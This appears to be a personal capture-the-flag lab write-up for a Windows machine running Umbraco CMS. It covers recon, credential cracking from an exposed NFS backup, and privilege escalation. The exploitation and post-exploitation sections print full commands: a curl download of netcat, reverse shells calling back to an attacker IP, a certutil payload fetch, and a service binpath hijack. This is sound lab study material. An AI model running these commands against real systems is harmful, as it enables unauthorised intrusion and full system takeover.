202212132157
Status: #idea
Tags: [[Labs]]

# Remote
IP: 10.10.10.180

## Recon

Ports Open:

```
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49678/tcp open  unknown
49679/tcp open  unknown
49680/tcp open  unknown
```

Full Nmap Scan:

```
PORT      STATE SERVICE       VERSION                                                                                                                                                                                                       
21/tcp    open  ftp           Microsoft ftpd                                                                                                                                                                                                
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                                                                                                                                                      
| ftp-syst:                                                                                                                                                                                                                                 
|_  SYST: Windows_NT                                                                                                                                                                                                                        
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn 
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-12-14T03:04:35
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
```

Port 21 - FTP:

- There seems to be nothing for anonymous login

Port 445 - SMB:

- Access Denied

Port 2049 - NFS:

- Exporting folders available for mounting on nfs:

```
showmount -e 10.10.10.180

Export list for 10.10.10.180:
/site_backups (everyone)
```

- Mounting the folder:

```
mkdir /mnt/remote

mount -t nfs 10.10.10.180:/site_backups /mnt/remote -o nolock
```
- The webapp seems to be using Umbraco CMS.
- The umbraco.sdf file reveals SHA1 hashed password for admin@htb.local
- Cracked: `admin@htb.local:baconandcheese`
- Login Portal at `http://10.10.10.180/umbraco/`
- Successfully logged in with credentials.
- Discovered version through `help` option on the dashboard: `7.12.4`
- There are multiple exploits for this version of Umbraco.

## Exploitation

- Using the exploit: `https://www.exploit-db.com/exploits/49488`
- We first upload a netcat executable into the victim machine and proceed to getting a reverse shell by executing a command that calls back to us:

```bash
python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c curl -a "10.10.14.6/nc.exe -o C:/Windows/Temp/nc.exe"

python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c C:/Windows/Temp/nc.exe -a "10.10.14.6 1234 -e cmd"
```

- We successfully get a shell

## Post Exploitation

- We upload winPEAS with certutil and run it:

```
certutil -urlcache -f http://10.10.14.6/winPEAS.exe winPEAS.exe

winPEAS.exe
```

- We discover that we have all access to the service `UsoSvc`:

```
Modifiable Services                                                                                                  
 Check if you can modify any service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s: 
    RmSvc: GenericExecute (Start/Stop)
    UsoSvc: AllAccess, Start
```

-  Now we can modify the binpath and restart the service to get a reverse shell:

```
1. sc config UsoSvc binpath= "C:\Windows\Temp\nc.exe 10.10.14.6 6969 -e cmd"
2. nc -nvlp 6969 #On Attacker Machine
3. sc stop UsoSvc
4. sc start UsoSvc
```

- We get a reverse shell and are root





---
# References
